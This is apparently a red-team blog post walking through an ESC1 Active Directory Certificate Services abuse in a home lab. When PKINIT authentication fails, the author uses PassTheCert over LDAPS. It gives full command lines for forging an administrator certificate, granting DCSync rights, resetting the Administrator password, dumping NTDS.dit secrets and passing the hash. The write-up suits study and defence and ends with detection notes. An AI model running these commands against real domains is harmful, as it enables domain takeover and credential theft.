---
layout: post
title: "What if no PKINIT? Still the same fun!"
image: ""
date: 2024-05-18 10:10:10
tags:
  - ADCS
  - Kerberos

description: ""
categories:
  - Active Directory
---

<!-- add the button style & script -->
<link rel="stylesheet" href="/assets/css/applause-button.css"/>
<script src="/assets/js/applause-button.js"></script>

<style>
	#myBtn {
  		display: none;
  		position: fixed;
  		bottom: 40px;
  		right: 50px;
  		z-index: 99;
  		font-size: 12px;
  		border: 1px solid black;
  		outline: black;
  		background-color: #262626;
  		color: white;
  		cursor: pointer;
  		padding: 10px 22px 10px 22px;
  		border-radius: 10px;
  		font-family: 'Open Sans';
	}

	#myBtn:hover {
  		background-color: #5d4d7a;
	}
	applause-button {
		margin: auto;
	}
	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.post-images {
		max-width: 100%;
	}

  .post-images2 {
		max-width: 50%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}

	table {
	width: 70%;
	border-collapse: collapse;
	}

	table, th, td {
	border: 1px solid black;
	}

	th, td {
	text-align: left;
	padding: 8px;
	}

	tr:nth-child(even) {
	background-color: #f2f2f2;
	}

	@media screen and (max-width: 600px) {
	table, thead, tbody, th, td, tr {
		display: block;
	}

	thead tr {
		position: absolute;
		top: -9999px;
		left: -9999px;
	}

	tr {
		border: 1px solid #ccc;
	}

	td {
		border: none;
		border-bottom: 1px solid #eee;
		position: relative;
		padding-left: 50%;
	}

	td:before {
		position: absolute;
		top: 6px;
		left: 6px;
		width: 45%;
		padding-right: 10px;
		white-space: nowrap;
		content: attr(data-label);
	}

</style>

<button onclick="topFunction()" id="myBtn" title="Go to top">↑</button>

<script>
// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}
</script>

<p>Hello, world! Hello, world! <a href="https://twitter.com/nickvourd">@nickvourd</a> is calling! Just your friendly neighborhood Red <del>Teamer</del> Power Ranger😝! Welcome back to another blog post...</p>

<div style="display: flex; justify-content: center;">
    <iframe src="https://giphy.com/embed/SKqyoM5mvEZAA" width="480" height="270" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
</div>

<p>To be honest, there are few people who inspired me to start this journey of writing only about what I like, without worrying about whether it's popular or not! Well, this Orthodox Easter, I met up with <a href="https://twitter.com/LAripping">@LAripping</a> at our secret spot (🤫) after a long time. A technical conversation with him, especially about my favorite topic, Active Directory (AD), always inspires me with new ideas! Thanks, Leo, you have put your little stone for this blog post, even if you don't know it. Additionally, many Discord calls these days with <a href="https://twitter.com/S1ckB0y1337">@S1ckB0y1337</a>, discussing various concerns and topics related to offensive security and other subjects, have helped me understand a lot and clarify my goals for my penetration testing career. Nick, I can't express my appreciation for all the years of your help and support. One day, I promise I will repay all the good that you've done for me!</p><br />

<p>PS: Thanks to <a href="https://twitter.com/Papadope9">@Papadope9</a> who introduced me to this <a href="https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer">plugin</a> for VS Code and saved my time!</p><br />

<p>Several days ago, I was building a home lab for private research on Active Directory Certificate Services (ADCS) attacks. I was dealing with ESC1 misconfiguration when I found something very unusual. For those who aren't familiar with ESC1 or generally ADCS attacks, I totally recommend the <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">140-slides whitepaper</a> by <a href="https://twitter.com/harmj0y">Will Schroeder</a> and <a href="https://twitter.com/tifkin_">Lee Chagolla-Christensen</a>.<br/><br/>Returning to our topic, while enumerating the Enterprise CA with <a href="https://github.com/ly4k/Certipy">Certipy</a> tool (by <a href="https://twitter.com/ly4k_">Oliver Lyak</a>), I found that the "candidate" certificate template contained all the prerequisites to be vulnerable to ESC1:</p>

```
certipy find -username n.kiriazis@homelab.local -password '<password>' -dc-ip 192.168.242.179
```

<img src="/assets/img/post-img/18-05-2024/Cert-Termplate-Enum.png" class="post-images" alt="Cert-Termplate-Enum">

<p>The certificate template named "ESC1" is enabled, defines Client Authentication, and grants enrollment rights to Domain Users. The <code>EnrolleSuppliesSubject</code> is enabled, which allows the certificate requestor to provide any Subject Alternative Name (SAN). Moreover, manager approval and authorized signature options are not required. Bingo! The template is vulnerable to ESC1! Thus, I tried to abuse it by specifying an arbitrary SAN, such as "Domain Admin":</p>

```
certipy req -u n.kiriazis@homelab.local -p '<password>' -ca 'homelab-CA01-CA' -template 'ESC1' -upn administrator@homelab.local -dc-ip 192.168.242.179 -target ca01.homelab.local
```
<img src="/assets/img/post-img/18-05-2024/Request-a-SAN.png" class="post-images" alt="Request-a-SAN">

<p>Sweet! Our encrypted PFX certificate is ready to go! However, when I tried to request a Ticket Granting Ticket (TGT), I encountered the following error message: <code>KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)</code>:</p>

```
certipy auth -pfx administrator.pfx -dc-ip 192.168.242.179
```

<img src="/assets/img/post-img/18-05-2024/Kerberos-Error.png" class="post-images" alt="Kerberos-Error">

<p>The following GIF describes my face when I saw this error:</p>

<div style="display: flex; justify-content: center;">
    <iframe src="https://giphy.com/embed/Qe5oD5aXjEbKw" width="480" height="439" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
</div>

<h3>PKINIT</h3>

<p>Searching the error on Google, I found different approaches and solutions, but it is important to analyze the error step by step. What is PKINIT? The first time I read the term PKINIT was in <a href="https://twitter.com/elad_shamir">Elad Shamir</a>'s <a href="https://eladshamir.com/2021/06/21/Shadow-Credentials.html">blog</a>. PKINIT stands for Public Key Cryptography for Initial Authentication in Kerberos. PKINIT is an extension of the Kerberos protocol that enables clients to authenticate to the Key Distribution Center (KDC) using public key cryptography, specifically X.509 digital certificates, as a pre-authentication method instead of passwords.</p><br />

<h3>Kerberos pre-authentication</h3>

<p>At this point, let's delve into the significance of Kerberos pre-authentication. Firstly, it's crucial to understand that the user/secret key is derived from the user's hashed password, which is stored within the KDC. Pre-authentication is the primary step wherein a user authenticates themselves before the KDC issues them a TGT. It's essential to understand how Kerberos pre-authentication works in practice. Along with the initial request (<code>KRB_AS_REQ</code>), the user includes pre-authentication data. This data typically encompasses a timestamp encrypted with the user key, ensuring uniqueness and guarding against replay attacks. Additionally, it includes the username of the authenticated user, the Service Principal Name (SPN) linked with the krbtgt account, and a nonce, a unique number generated by the user for each authentication attempt. These pre-authenticated details are intelligible only to the client and the KDC, reinforcing the security of the authentication process.<br /><br />The following image shows the high-level structure of the <code>KRB_AS_REQ</code> message:</p>

<img src="/assets/img/post-img/18-05-2024/krb_as_req.drawio.png" class="post-images" alt="krb_as_req_diagram">

<p>After receiving the request, the KDC verifies the user's identity by decrypting the timestamp. If the information is correct, it responds with a <code>KRB_AS_REP</code> message. The following diagram illustrates the <code>KRB_AS_REQ</code> and <code>KRB_AS_REP</code> procedure:</p>

<img src="/assets/img/post-img/18-05-2024/KRB_AS_REQ_KRB_AS_REP.drawio.png" class="post-images" alt="KRB_AS_REQ_KRB_AS_REP">

<p>As depicted in the above image, the <code>KRB_AS_REP</code> message returns to the user a TGT and a session key encrypted with the user key. The session key is mainly used for later actions like requesting Ticket Granting Service (TGS) tickets instead of using the user's long-term key directly. The big advantage of the session key is that it's only valid for the current session and not for future ones. This keeps the user's long-term key safer. However, I will explain all of this stuff in more detail in a future blog post, as I promised to my partner in crime S1ckB0y1337. All you need to know for now is that the pre-authentication can be validated symmetrically (with secret key) or asymmetrically (with certificates).</p><br />

<h3>Back to our error</h3>

<p>When I saw this error, I started searching on Google for it, and found the two very helpful posts. The first one was by Will Schroeder, which explained how the misconfigurations in ADCS changed or were patched (some of them) after a year of releasing his ADCS whitepaper. Thus, in his <a href="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d">"Certificates and Pwnage and Patches, Oh My!"</a> blog post, I found a paragraph mentioning the specific error.<br /><br />According to Will, this error occurs for few reasons. Typically, this happens if a certificate is not linked to a root Certificate Authority (CA) trusted by the Domain Controller (DC) or does not linked to a CA in the NTAuthCertificates store. At this point, you might be wondering what the NTAuthCertificates store is. Let me open a parenthesis here to explain that term. It's a part of Active Directory where certificates are stored. More specifically, it is an AD object with the type "CertificationAuthority" within the Configuration Partition of the AD forest. For an overall structure named i.e., <b>dc01.homeland.local</b>, the object is located in the following LDAP path:</p>

```
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=homeland,DC=local
```

<p>As you can see from the following image (ADSI Edit tool output):</p>

<img src="/assets/img/post-img/18-05-2024/LDAP_ADSI_EDIT.png" class="post-images" alt="LDAP_ADSI_EDIT">

<p>Closing the parenthesis and back to our topic. Moreover, Will's blog post mentions that this error could occur due to a denied policy module, such as when an authenticated user lacks enrollment rights (not in our example) or has auto-enrollment rights. According to their research, the CA doesn’t actually perform an authorization check to validate that a user has auto-enrollment rights; they simply check if the user has enrollment rights.</p><br />

<p>Another <a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">useful post</a> that helped me to understand this error technically by presenting and analyzing a similar PKINIT error like <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> was by Yannick Méheut. In his article, he introduced his awesome tool named <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a>. I highly recommend checking out his article and his tool (I will come back to this later).</p><br />

<p>Finally, <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768">Microsoft's documentation</a> confirmed what I had discovered in the third blog post about this error.</p><br />

<h3>Behind the scenes</h3>

<p>Trying to understand what is happening with the error behind the scenes, I fired up Wireshark and reproduced the entire process. As you can see in the following picture, the error appears like this in Wireshark:</p>

<img src="/assets/img/post-img/18-05-2024/Error-in-Wireshark.png" class="post-images" alt="Error-in-Wireshark">

<p>As you can see, Wireshark displays the <code>error-code: eRROR-CLIENT-NOT-TRUSTED (62)</code>, indicating that the server does not trust the client and cannot authenticate the client's identity properly.</p><br />

<h3>Back to basics</h3>

<p>Searching for alternative ways to utilize my encrypted PFX certificate without relying on any Kerberos authentication extensions, I came across the blog post titled "<a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned</a>" by Will Schroeder and Lee Chagolla-Christensen. This article was the first one released after the publication of their 140-slide whitepaper. In this article, Will and Lee, or Lee and Will, provide a summary of the misconfigurations and interesting TTPs detailed in their whitepaper. Also, the most interesting part in this article is where they explain the research about the protocols that can use Schannel (the security package backing SSL/TLS) to authenticate domain users, such as LDAPS (a.k.a. LDAP-SSL).</p><br />

<p>Yannick's blog post, like mine, uses pfx certificates for LDAP authentication. He faced a different error, but we both share the issue of preventing Kerberos authentication through PKINIT. Now, we need to invastigate if his certificate authentication method via LDAP can help with my error. Thus, let's utilize <a href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python">python PassTheCert tool</a> by <a href="https://twitter.com/lowercase_drm">@lowercase_drm</a>.</p><br />

<p>First of all, before utilizing the python PassTheCert tool, we should use the Certipy tool to extract the public cert from the PFX file:</p>

```
certipy cert -pfx /root/administrator.pfx -nokey -out admin.crt 
```

<img src="/assets/img/post-img/18-05-2024/Extract-Public-Key.png" class="post-images" alt="Extract-Public-Key">

<p>Then, we should extract the private key using the Certipy tool again:</p>

```
certipy cert -pfx /root/administrator.pfx -nocert -out admin.key 
```

<img src="/assets/img/post-img/18-05-2024/Extract_Private_Key.png" class="post-images" alt="Extract_Private_Key.png">

<p>After that we will use python PassTheCert tool to execute whoami command via LDAPS:</p>

```
python3 passthecert.py -dc-ip 192.168.242.179 -crt admin.crt -key admin.key -domain homelab.local -action whoami
```

<img src="/assets/img/post-img/18-05-2024/PassTheCert-Execute-Whoami.png" class="post-images" alt="PassTheCert-Execute-Whoami">

<p>Cool! Let's see what is going on in the background again by using Wireshark to capture the traffic:</p>

<img src="/assets/img/post-img/18-05-2024/LDAP-Wireshark.png" class="post-images" alt="LDAP-Wireshark">

<p>As you can see, the tool uses LDAP protocol to communicate with the target via Schannel. Since we know that we can execute commands via LDAPS, let's see how we can abuse the target using the "stolen" certificate. The following list describes the different TTPs which an attacker can use against the target:
<ul>
  <li>Granting DCSync rights to a user.</li>
  <li>Performing an Resource-Based Constrained Delegation (RBCD) attack.</li>
  <li>Resetting the password of a user account.</li>
</ul>
</p><br />

<h3>Hacking time</h3>

<p>The following attacks are possible since we have the administrator’s certificate! I will skip the RBCD attack since is described in Yannick's blog post due to the <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> error. The methodology for these attacks remains the same for both errors.</p><br /><br />

<h4>Attack #1: Granting DCSync rights to a user</h4>

<p>For this attack, we will target our low-privileged user, <code>n.kiriazis</code>, by granting DCSync rights. In this way,  <code>n.kiriazis</code> will be able to retrieve all NTDS.dit secrets. Keep in mind that, in order to retrieve the secrets from NTDS.dit, the targeted user should be someone whose credentials you possess.</p>

```
python3 passthecert.py -dc-ip 192.168.242.179 -crt admin.crt -key admin.key -domain homelab.local -action modify_user -target n.kiriazis -elevate
```
<img src="/assets/img/post-img/18-05-2024/Grant-Dcsync-Rights.png" class="post-images" alt="Grant-Dcsync-Rights">

<p>Perfect! The user <code>n.kiriazis</code> now has DCSync rights. Let's retrieve the NTDS.dit secrets with Impacket's secretsdump:</p>

```
impacket-secretsdump n.kiriazis@dc01.homelab.local
```

<img src="/assets/img/post-img/18-05-2024/dcsync-impacket.png" class="post-images" alt="dcsync-impacket">

<p>Last but not least, use a technique such as Pass-the-Hash with Impacket's psexec or wmiexec to connect remotely to the Domain Controller (DC):</p>

```
impacket-psexec administrator@dc01.homelab.local -dc-ip 192.168.242.179 -hashes :07fadc7e00643f5733e6c4449b2cf3e1
```

<img src="/assets/img/post-img/18-05-2024/Pass-The-Hash.png" class="post-images" alt="Pass-The-Hash">

<h4>Attack #2: Resetting the password of a user account</h4>

<p>For this attack, we need to choose another target with escalated privileges, such as a Domain Admin. The following command provides you with what you need for this:</p>

```
python3 passthecert.py -dc-ip 192.168.242.179 -crt admin.crt -key admin.key -domain homelab.local -action modify_user -target Administrator -new-pass 'Passw0rd!'
```

<p>Then, we can use the new password to connect via Impacket's psexec or wmiexec on the DC as DA or System:</p>

<img src="/assets/img/post-img/18-05-2024/Attack2.png" class="post-images" alt="Attack2">

<h3>Mitigations/Detections</h3>

<p>Searching for a quick solution to fix this error and continue with my lab implementation, I found the following tweet by <a href="https://x.com/gentilkiwi">Benjamin Delpy</a>, indicating that he was years ahead of us (the global community).</p>

<a href="https://x.com/gentilkiwi/status/1419772619004448770" target="_blank">
  <img src="/assets/img/post-img/18-05-2024/Benjamin-post.png" class="post-images" alt="Benjamin-post">
</a>

<p>At this point, it is important to note that Benjamin's solution seems useful for home labs where you already have administrative access and can fix the error, rather than for a real engagement.</p><br /><br />

<p>Yannick's article highlights two event IDs crucial for defenders to monitor in the Pass The Certificate attack: Event ID <code>4648</code> and <cod>4648</code> generated by Schannel. Schannel tries to link the credential with a user account using Kerberos's S4U2Self functionlaity. If that doesn't work, it then tries to match the certificate with a user account. It looks at things like the certificate's SAN extension, a combination of the subject and issuer fields, or just the issuer.</p><br /><br />

<h3>Conclusion</h3>

<p>Dear reader, I hope you enjoyed my first article. If you've gained new knowledge or found it helpful for your engagement, I would be delighted. Until next time, NCV, your friendly Red Power Ranger! 😊</p>

<br /><br />

<!-- add the button!-->
<div>
<applause-button style="width: 58px; height: 58px;" color="#5d4d7a" url="https://nickvourd.github.io/what-if-no-pkinit-still-the-same-fun/"/>
</div> 